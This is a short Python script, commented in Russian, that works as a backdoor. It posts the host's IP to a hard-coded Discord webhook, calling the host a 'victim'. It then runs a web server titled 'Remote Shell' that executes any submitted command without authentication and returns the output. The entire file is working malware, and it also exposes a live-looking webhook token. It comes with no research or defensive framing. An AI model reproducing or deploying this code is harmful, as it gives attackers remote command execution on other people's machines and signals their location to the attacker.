import http.server
import socketserver
import subprocess
import urllib.parse
import socket
import requests

PORT = 8080
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1353497620655509554/XB0qrjAK9jahbdxc_ZzrlQA3_x6MMJSJ3_TVGUUiQmADHPQ7U3a8dJZloxeQJSvLC4Ma"

# Получаем IP жертвы
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

# Отправляем IP на Discord
requests.post(DISCORD_WEBHOOK, json={"content": f"Жертва в сети: http://{local_ip}:{PORT}"})

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"""
                <html>
                <head>
                    <title>Remote Shell</title>
                </head>
                <body>
                    <h1>Remote Shell</h1>
                    <form method="GET" action="/cmd">
                        <input type="text" name="command" placeholder="Enter command" style="width: 300px;">
                        <input type="submit" value="Execute">
                    </form>
                    <pre id="output"></pre>
                </body>
                </html>
            """)
        elif self.path.startswith("/cmd?command="):
            command = urllib.parse.unquote(self.path.split("=")[1])
            output = subprocess.getoutput(command)
            
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            response_html = f"""
                <html>
                <head>
                    <title>Command Output</title>
                </head>
                <body>
                    <h1>Command Executed: {command}</h1>
                    <pre>{output}</pre>
                    <a href=''>Back</a>
                </body>
                </html>
            """
            self.wfile.write(response_html.encode())

print(f"Сервер запущен! Жертва в сети: http://{local_ip}:{PORT}")

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    httpd.serve_forever()
